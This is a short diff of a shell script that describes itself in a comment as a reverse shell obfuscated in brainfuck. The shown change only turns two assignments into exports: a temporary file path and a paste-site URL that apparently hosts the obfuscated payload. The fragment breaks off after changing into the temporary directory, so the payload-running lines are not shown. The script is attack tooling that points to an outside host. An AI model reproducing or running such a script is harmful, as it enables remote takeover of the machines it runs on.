@@ -1,8 +1,8 @@
 #!/bin/sh
 #reverse shell obfuscated in brain*uck
 
-FILE=$TMPDIR/+++++
-BRAIN=https://paste.c-net.org/DisobeyPajama
+export FILE=$TMPDIR/+++++
+export BRAIN=https://paste.c-net.org/DisobeyPajama
 
 cd $TMPDIR
 
